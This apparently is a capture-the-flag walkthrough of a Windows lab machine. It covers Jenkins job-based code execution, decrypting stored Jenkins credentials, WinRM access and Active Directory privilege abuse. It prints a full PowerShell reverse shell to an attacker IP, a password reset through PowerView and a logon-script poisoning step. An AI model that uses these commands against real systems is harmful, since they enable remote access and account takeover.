# Enumeration
## TCP ports
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.96.147
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-21 15:08 +0100
Nmap scan report for 10.129.96.147
Host is up (0.012s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 66.29 seconds
```

### Nmap
```python
nmap -p 80,5985,8080 -A --min-rate=2000 -sT 10.129.96.147      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-21 15:10 +0100
Nmap scan report for 10.129.96.147
Host is up (0.013s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-server-header: Jetty(9.4.43.v20210629)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Two webservers and also winrm

Cannot really do anything with winrm until i get credentials

## UDP ports
### Open ports
```python
nmap -p- -sU --min-rate=2000 -sT 10.129.96.147
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-21 15:10 +0100
Nmap scan report for 10.129.96.147
Host is up (0.013s latency).
Not shown: 65532 filtered tcp ports (no-response), 65531 open|filtered udp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
8080/tcp open  http-proxy
53/udp   open  domain
88/udp   open  kerberos-sec
123/udp  open  ntp
389/udp  open  ldap

Nmap done: 1 IP address (1 host up) scanned in 132.14 seconds
```
Here is where LDAP and kerberos are running

### Nmap
```python
nmap -p 53,88,123,389 -A --min-rate=2000 -sU 10.129.96.147                                                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-21 15:15 +0100
Nmap scan report for 10.129.96.147
Host is up (0.081s latency).

PORT    STATE    SERVICE      VERSION
53/udp  open     domain       Simple DNS Plus
88/udp  open     kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-21 14:15:28Z)
123/udp open     ntp          NTP v3
| ntp-info: 
|_  
389/udp open     ldap         Microsoft Windows Active Directory LDAP (Domain: object.local, Site: Default-First-Site-Name)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
Service Info: Host: JENKINS; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Domain name is object.local

Ill add that to `/etc/hosts`

# HTTP (80)
## Nuclei
```python
nuclei -u http://object.local/                           

[iis-shortname-detect] [http] [info] http://object.local/*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://object.local/zrb0nlkk*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://object.local/*~1*/a.aspx
[waf-detect:modsecurity] [http] [info] http://object.local/
[microsoft-iis-version] [http] [info] http://object.local/ ["Microsoft-IIS/10.0"]
[missing-sri] [http] [info] http://object.local/ ["https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-1b93190375e9ccc259df3a57c1abc0e64599724ae30d7ea4c6877eb615f89387.js","https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js","https://cdnjs.cloudflare.com/ajax/libs/gsap/1.15.0/TweenMax.min.js","https://s3-us-west-2.amazonaws.com/s.cdpn.io/28963/modernizr.custom.18922.js","https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js","https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css"]
[http-missing-security-headers:x-frame-options] [http] [info] http://object.local/
[http-missing-security-headers:x-content-type-options] [http] [info] http://object.local/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://object.local/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://object.local/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://object.local/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://object.local/
[http-missing-security-headers:permissions-policy] [http] [info] http://object.local/
[http-missing-security-headers:referrer-policy] [http] [info] http://object.local/
[http-missing-security-headers:clear-site-data] [http] [info] http://object.local/
[http-missing-security-headers:missing-content-type] [http] [info] http://object.local/
[http-missing-security-headers:strict-transport-security] [http] [info] http://object.local/
[http-missing-security-headers:content-security-policy] [http] [info] http://object.local/
[options-method] [http] [info] http://object.local/ ["OPTIONS, TRACE, GET, HEAD, POST"]
[tech-detect:ms-iis] [http] [info] http://object.local/
[caa-fingerprint] [dns] [info] object.local
```
## Feroxbuster
```python
Nothing found
```
## Subdomains
```python
Nothing found
```
## Website functionality
![985](Pasted%20image%2020260421152140.png)

Looks to be just a static site with a link to the other web service running on port 8080

![](Pasted%20image%2020260421152057.png)

Found an `ideas` user on here!

# HTTP (8080)

![](Pasted%20image%2020260421152533.png)

This is a Jenkins instance

![419](Pasted%20image%2020260421153223.png)

I can also create an account!

## Nuclei 
```python
Nothing found
```

## Subdomains
```python
Nothing found
```

## Access to jenkins
Ive made an account on there

I can see that the version is `Jenkins 2.317`

# Remote code execution

https://blog.cyberadvisors.com/technical-blog/blog/jenkins-remote-execution-via-malicious-jobs

This article explains how i can get RCE via a job created in jenkins

Although the method is not the exact same in this instance. I cannot build the job once created since i dont have permission but i can schedule it to execute

So ill follow all the steps in the article to create the job but instead ill set a schedule to make it execute

![1229](Pasted%20image%2020260421161327.png)

Instead ill configure it this way this way it should execute every minute then once this succeeds maybe i can work on getting a shell

After saving and waiting a minute i see a new build

![](Pasted%20image%2020260421161541.png)

![](Pasted%20image%2020260421161603.png)

Hovering over build `#1` and selecting console output in the dropdown i see that this has executed my command

So now ill stop the job modify it for a powershell command

```python
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.90', 1337);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```
Ill add this command i got from revshells.com to connect back to my IP address

Then ill save then re enable the job and see if i get a connection back!

So after trying a few times and failing ill try to find credentials instead!

```python
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\evil>powershell -c dir -force C:\Users\oliver\AppData\Local\Jenkins\.jenkins\ 


    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/21/2026   8:09 AM                jobs                                                                  
d-----       10/20/2021  10:19 PM                logs                                                                  
d-----       10/20/2021  10:08 PM                nodes                                                                 
d-----       10/20/2021  10:12 PM                plugins                                                               
d-----       10/20/2021  10:26 PM                secrets                                                               
d-----       10/25/2021  10:31 PM                updates                                                               
d-----       10/20/2021  10:08 PM                userContent                                                           
d-----        4/21/2026   7:42 AM                users                                                                 
d-----       10/20/2021  10:13 PM                workflow-libs                                                         
d-----        4/21/2026   8:15 AM                workspace                                                             
-a----        4/21/2026   7:41 AM              0 .lastStarted                                                          
-a----       11/10/2021   2:20 AM             41 .owner                                                                
-a----        4/21/2026   7:41 AM           2505 config.xml                                                            
-a----        4/21/2026   7:41 AM            156 hudson.model.UpdateCenter.xml                                         
-a----       10/20/2021  10:13 PM            375 hudson.plugins.git.GitTool.xml                                        
-a----       10/20/2021  10:08 PM           1712 identity.key.enc                                                      
-a----        4/21/2026   7:41 AM              5 jenkins.install.InstallUtil.lastExecVersion                           
-a----       10/20/2021  10:14 PM              5 jenkins.install.UpgradeWizard.state                                   
-a----       10/20/2021  10:14 PM            179 jenkins.model.JenkinsLocationConfiguration.xml                        
-a----       10/20/2021  10:21 PM            357 jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml           
-a----       10/20/2021  10:21 PM            169 jenkins.security.QueueItemAuthenticatorConfiguration.xml              
-a----       10/20/2021  10:21 PM            162 jenkins.security.UpdateSiteWarningsConfiguration.xml                  
-a----       10/20/2021  10:08 PM            171 jenkins.telemetry.Correlator.xml                                      
-a----        4/21/2026   7:41 AM            907 nodeMonitors.xml                                                      
-a----        4/21/2026   8:30 AM            130 queue.xml                                                             
-a----       10/20/2021  10:28 PM            129 queue.xml.bak                                                         
-a----       10/20/2021  10:08 PM             64 secret.key                                                            
-a----       10/20/2021  10:08 PM              0 secret.key.not-so-secret
```
There is a config.xml file

Nothing really of interest in that file

```python
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\evil>powershell -c type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml 
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
```
After searching around for a while i found another config.xml file

This time it had both an encrypted password and password hash!

After doing some research i see there are ways to decrypt the password using certain files from the system 

Ill need `hudson.util.Secret` and `master.key` on my system to perform an offline decrypt

Both of those files are stored in the `secrets/` directory

After retrieving the master key which i could just copy i needed the secret which wasnt as easy as copying it to a file

Instead ive had to base64 encode the output then decode it on my system then output it to a file

The password decrypted to:

```python
oliver:c1cdfun_d2434
```
Ive use the below tool to decrypt this:

https://github.com/gquere/pwn_jenkins

# Evil-winrm access as `oliver`

```python
evil-winrm -i object.local -u oliver -p 'c1cdfun_d2434'                               
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\oliver\Documents>
```
No interesting privileges

I think ill upload sharphound to the target to collect bloodhound data

```python
*Evil-WinRM* PS C:\Users\oliver\Desktop> upload SharpHound.exe
                                        
Info: Uploading /home/kali/htb/object/SharpHound.exe to C:\Users\oliver\Desktop\SharpHound.exe
                                        
Data: 1802240 bytes of 1802240 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\oliver\Desktop> dir


    Directory: C:\Users\oliver\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/21/2026   7:59 AM        1351680 SharpHound.exe
-ar---        4/21/2026   7:40 AM             34 user.txt


*Evil-WinRM* PS C:\Users\oliver\Desktop> .\SharpHound.exe -c All
```
This uploaded and ran sharphound

```python
*Evil-WinRM* PS C:\Users\oliver\Desktop> download 20260421075942_BloodHound.zip
                                        
Info: Downloading C:\Users\oliver\Desktop\20260421075942_BloodHound.zip to 20260421075942_BloodHound.zip
                                        
Info: Download successful!
```
I now have the data i can upload it to bloodhound

# Bloodhound

![948](Pasted%20image%2020260421170514.png)

I have ForceChangePassword on the user `smith`

LDAP is not accessible via TCP so ill do all of this from the windows command line

# Changing `smith` password
```python
*Evil-WinRM* PS C:\Users\oliver\Desktop> upload powerview.ps1
                                        
Info: Uploading /home/kali/htb/object/powerview.ps1 to C:\Users\oliver\Desktop\powerview.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```
Ill start by uploading powerview

```python
*Evil-WinRM* PS C:\Users\oliver\Desktop> Import-Module .\powerview.ps1
*Evil-WinRM* PS C:\Users\oliver\Desktop> $NewPassword = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\oliver\Desktop> Set-DomainUserPassword -Identity 'smith' -AccountPassword $NewPassword
```
This changed `smith` password

# Compromising `smith`
```python
evil-winrm -i object.local -u smith -p 'Password1234!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\smith\Documents> 
```
So after looking back at bloodhound this user is also part of remote management users

# Bloodhound on `smith`
![](Pasted%20image%2020260421171647.png)

GenericWrite on `maria` 

A targeted kerberoast attack does not work and shadow credentials dont either

# Poisoning the logon script

```python
*Evil-WinRM* PS C:\Users\smith\Documents> echo "dir \users\maria\ > \programdata\content" > maria.ps1
*Evil-WinRM* PS C:\Users\smith\Documents> mv maria.ps1 C:\programdata
*Evil-WinRM* PS C:\Users\smith\Documents> dir C:\programdata


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-       10/21/2021   3:13 AM                Microsoft
d-----       10/21/2021  12:05 AM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----        4/10/2020   5:48 AM                ssh
d-----        4/10/2020  10:49 AM                USOPrivate
d-----        4/10/2020  10:49 AM                USOShared
d-----        8/25/2021   2:57 AM                VMware
-a----        4/21/2026   8:47 AM             86 maria.ps1


*Evil-WinRM* PS C:\Users\smith\Documents> 
```